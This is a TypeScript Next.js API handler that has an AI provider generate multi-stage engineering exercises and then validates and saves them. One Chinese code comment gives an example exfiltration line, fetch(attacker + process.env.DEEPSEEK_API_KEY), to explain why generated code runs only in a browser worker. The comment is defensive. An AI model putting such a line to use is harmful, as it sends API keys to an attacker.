import type { NextApiRequest, NextApiResponse } from 'next';
import {
  abortSignalFor,
  AIProviderConfig,
  ChatMessage,
  extractJson,
  NoProviderError,
  streamStructured,
  statusForError,
} from '../../src/lib/server/aiProvider';
import { coerceProject, validateProjectShape } from '../../src/lib/engineering/validateProject';
import { addUserProject } from '../../src/lib/server/projectStore';
import type { EngineeringProject } from '../../src/lib/engineering/types';

export const config = {
  api: {
    responseLimit: false,
    bodyParser: { sizeLimit: '8mb' },
  },
};

const PLATFORM_DOC = `The workspace runs in a sandboxed multi-file CommonJS/TypeScript runtime on a VIRTUAL CLOCK.
Learner code may only import from other workspace files and from these virtual modules:

  import { request } from '@lab/net';
     request(url, options?) -> Promise<{ status, data, url }>, rejects with LabHttpError { status, url }.
     Every call is measured: concurrency, latency, retries, duplicates, throttling.
  import { sleep, now, random } from '@lab/env';
     Virtual clock. sleep(200) advances virtual time instantly.
  import { count, getCounters, getMetrics } from '@lab/metrics';
     Custom counters, readable from specs.

Inside the sandbox, setTimeout/setInterval/Date.now/performance.now are already wired to the virtual clock.
There is NO filesystem, NO real network, NO npm packages, NO DOM.

Spec files use a tiny built-in framework with these globals (do NOT import them):
  describe, it, expect, beforeEach, afterEach
Available matchers: toBe, toEqual, toBeTruthy, toBeFalsy, toBeNull, toBeUndefined, toBeDefined,
  toBeInstanceOf, toBeGreaterThan(OrEqual), toBeLessThan(OrEqual), toBeCloseTo, toContain,
  toHaveLength, toHaveProperty, toMatch, toThrow, .not, and for async:
  await expect(async () => fn()).rejects.toThrow('message')

Specs import learner code with relative paths, e.g. import { fetchAll } from '../src/fetcher';

Metric gates are asserted by the platform against LabMetrics. Valid metric paths:
  virtualElapsedMs, maxConcurrency,
  requests.total, requests.ok, requests.failed, requests.throttled, requests.retries, requests.duplicated,
  counters.<your counter name>
A gate may carry "scope": a substring of a test's full name ("suite > case"); the gate is then evaluated
only against the metrics of the matching case. ALWAYS use scope when a stage has tests that deliberately
demonstrate slow or serial behaviour, otherwise the aggregate metrics will fail your own gate.`;

const SCHEMA = `{
  "id": "kebab-case-id",
  "title": { "zh": "...", "en": "..." },
  "summary": { "zh": "one sentence", "en": "one sentence" },
  "difficulty": "Easy|Medium|Hard",
  "domain": "concurrency|caching|reliability|architecture|data|...",
  "tags": ["..."],
  "estimatedMinutes": 90,
  "language": "typescript",
  "brief": { "zh": "markdown: context, goal table, hard constraints, non-goals, glossary", "en": "same, in English" },
  "architecture": { "zh": "optional markdown, may contain a mermaid diagram", "en": "..." },
  "weights": { "correctness": 3, "concurrency": 1.5, "latency": 1.5, "resilience": 1, "encapsulation": 1.5, "elegance": 1 },
  "files": [
    { "path": "src/contract.ts", "content": "shared types the learner must satisfy", "readonly": true }
  ],
  "stages": [
    {
      "id": "kebab-case",
      "title": { "zh": "...", "en": "..." },
      "primer": { "zh": "markdown: teach every concept and term needed for this stage to a learner who only knows basic programming", "en": "same, in English" },
      "goal": { "zh": "markdown: what to build and why it matters in production", "en": "..." },
      "checklist": [{ "zh": "...", "en": "..." }],
      "pitfalls": [{ "zh": "a wrong approach AND why it fails in production", "en": "..." }],
      "hints": [{ "zh": "...", "en": "..." }],
      "extension": { "zh": "markdown: the real-world counterpart (libraries, papers, incidents)", "en": "..." },
      "starterFiles": [{ "path": "src/pool.ts", "content": "skeleton with signatures and TODO", "openByDefault": true }],
      "specs": [{ "path": "specs/stage-1.spec.ts", "content": "hidden acceptance tests" }],
      "gates": [
        { "metric": "maxConcurrency", "op": "lte", "value": 4,
          "label": { "zh": "...", "en": "..." }, "dimension": "concurrency", "scope": "gate:concurrency" }
      ],
      "lab": { "defaultLatencyMs": 100, "serverConcurrencyLimit": 5,
               "endpoints": { "/api/flaky": { "failFirstN": 2, "status": 503 } } },
      "focus": ["concurrency", "encapsulation"],
      "referenceFiles": [{ "path": "src/pool.ts", "content": "a COMPLETE working solution for this stage" }],
      "referenceNotes": { "zh": "why this design", "en": "..." }
    }
  ]
}`;

const RULES = `Hard requirements — the generated project is automatically executed before it is accepted:

1. Every stage MUST include referenceFiles that are a COMPLETE, WORKING implementation of that stage.
   The platform runs the reference implementation against the stage's specs; if anything fails, the project is rejected.
2. Every referenceFiles entry MUST have a matching starterFiles entry (same path) in that stage or an earlier one.
3. Stages are cumulative: stage N's workspace contains stage 1..N starter files plus the learner's earlier code.
   Stage N's specs may import modules introduced in earlier stages.
4. Starter files MUST NOT solve the problem: leave signatures plus TODO and \`throw new Error('not implemented')\`.
   The platform also runs the starter skeleton and REJECTS the project if the specs still pass.
5. Latency assertions must be exact and derived from the lab config. With defaultLatencyMs=100, 12 urls at
   concurrency 4 take exactly 300ms. Compute these numbers; do not guess.
6. Use 3 to 5 stages. Each stage introduces exactly one engineering concern and at least one metric gate
   (except a pure-design stage where none applies).
6b. DEPTH REQUIREMENTS — a thin project is rejected by the reviewer even if it executes:
   - each stage needs AT LEAST 6 spec cases, covering the happy path AND edge cases
     (empty input, single element, limit larger than the workload, boundary values, error propagation,
     and "the obvious wrong implementation is detected");
   - each stage needs 3-5 \`pitfalls\`. A pitfall is a WRONG APPROACH plus WHY it fails in production —
     not a restatement of the requirement. "Do not forget to await" is weak;
     "forgetting await makes the timing middleware report 0ms and swallows downstream errors" is right;
   - each stage needs an \`extension\` note naming real libraries, protocols or failure modes;
   - each stage needs a \`primer\` written for a learner with basic programming ability and no prior
     knowledge of the domain. Define every new term on first use, explain the data flow or state
     transition in plain language, and connect the model in the workspace to the real system. Use
     two or more short paragraphs. A glossary list by itself is not enough;
   - \`brief\` must contain: context with a concrete symptom, a stage table, hard constraints,
     non-goals, and a glossary of 3-4 terms;
   - \`goal\` must state the exact API contract the specs will call.
7. TypeScript only, no npm imports, no DOM, no real timers other than the sandbox ones.
8. Return ONLY the JSON object. No markdown fences, no prose.`;

function buildPrompt(request: string, language: 'en' | 'zh'): string {
  return `Design a multi-stage ENGINEERING PRACTICE project (not an algorithm puzzle) for this request:

"${request}"

A good project here is a small system a learner builds across stages — a bounded worker pool, a cache layer,
a gateway, a scheduler, a stream processor — where the interesting part is the engineering trade-off
(concurrency, latency, failure handling, module boundaries), not a clever algorithm.

${PLATFORM_DOC}

Return exactly this JSON shape:

${SCHEMA}

${RULES}

Write every zh field in Chinese and every en field in English. The learner's UI language is ${language}.`;
}

interface GenerateResponsePayload {
  success: boolean;
  project?: EngineeringProject;
  /** 结构性问题（字段缺失、路径对不上之类），执行层面的问题由浏览器验证后回传 */
  problems?: string[];
  saved: boolean;
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const {
      request,
      config: aiConfig,
      language = 'zh',
      project: presetProject,
      force,
      previous,
      problems: reportedProblems,
    } = req.body as {
      request?: string;
      config?: AIProviderConfig;
      language?: 'en' | 'zh';
      project?: EngineeringProject;
      force?: boolean;
      /** 上一版生成结果，配合 problems 走修复轮 */
      previous?: unknown;
      /** 浏览器里跑出来的失败信息 */
      problems?: string[];
    };

    // 保存：用户接受了一份生成结果（可能是验证通过的，也可能是「仍然保存」）
    if (presetProject && force) {
      const candidate = coerceProject(presetProject);

      /**
       * 「仍然保存」也要过结构校验。
       *
       * 之前这里是直接落盘的：一份缺关卡、缺起始文件或者标题为空的项目照样能写进
       * user-projects.json，然后在工作区里打不开。校验器放行的东西渲染器必须渲染得了，
       * 所以这道关必须和 validateProjectShape 是同一套判断。
       */
      const structuralProblems = validateProjectShape(candidate);
      if (structuralProblems.length > 0) {
        return res.status(400).json({
          error: 'The project is not structurally valid and was not saved',
          details: structuralProblems,
        });
      }

      try {
        const saved = addUserProject(candidate);
        return res.status(200).json({ success: true, project: saved, saved: true });
      } catch (writeError) {
        // 写盘失败过去是被外层 catch 吞成一句泛化的 500，用户只知道「失败了」
        console.error('Failed to persist generated project:', writeError);
        return res.status(500).json({
          error: `Could not write the project to disk: ${(writeError as Error).message}`,
        });
      }
    }

    if (!request || typeof request !== 'string') {
      return res.status(400).json({ error: 'Request description is required' });
    }

    const messages: ChatMessage[] = [
      {
        role: 'system',
        content:
          'You are a staff engineer who designs hands-on engineering exercises. You return only valid JSON. ' +
          'You always verify your own arithmetic for latency assertions before returning.',
      },
      { role: 'user', content: buildPrompt(request, language) },
    ];

    // 修复轮：把上一版和它的失败原因一起喂回去
    if (previous && Array.isArray(reportedProblems) && reportedProblems.length > 0) {
      messages.push(
        { role: 'assistant', content: JSON.stringify(previous).slice(0, 60000) },
        {
          role: 'user',
          content: `The project was executed by the platform and REJECTED. Fix these problems and return the complete corrected JSON (whole object, not a diff):

${reportedProblems.join('\n')}

Remember: reference implementations must actually pass the specs, latency numbers must be computed from the lab config, and starter skeletons must fail the specs.`,
        }
      );
    }

    // 一份工程题动辄几万字，等它写完再显示等于让用户对着转圈发呆好几分钟
    await streamStructured(res, messages, aiConfig, {
      temperature: previous ? 0.3 : 0.6,
      maxTokens: 16000,
      signal: abortSignalFor(res),
      onComplete: (raw) => {
        const project = coerceProject(extractJson<any>(raw));
        const structuralProblems = validateProjectShape(project);

        /**
         * 这里**只做结构校验**，不执行任何生成出来的代码。
         *
         * 真跑一遍是必要的（模型经常写出自己都过不了的参考实现），但那必须发生在
         * 浏览器的 Web Worker 里：它有独立的全局环境，看不到 process.env，也能被
         * terminate。放在这个 API 进程里跑，一个同步死循环就能让整个服务不再响应，
         * 而一句 fetch(attacker + process.env.DEEPSEEK_API_KEY) 就能把 key 带走。
         */
        const payload: GenerateResponsePayload = {
          success: true,
          project,
          problems: structuralProblems.length > 0 ? structuralProblems : undefined,
          saved: false,
        };
        return payload;
      },
    });
  } catch (error) {
    console.error('Generate project error:', error);
    const message =
      error instanceof NoProviderError
        ? error.message
        : (error as Error).message || 'Failed to generate project';
    // 流开始之后状态码已经定死，错误只能走事件
    if (res.headersSent) {
      res.write(`data: ${JSON.stringify({ type: 'error', message })}\n\n`);
      res.write(`data: ${JSON.stringify({ type: 'done' })}\n\n`);
      res.end();
      return;
    }
    return res.status(statusForError(error)).json({ error: message });
  }
}
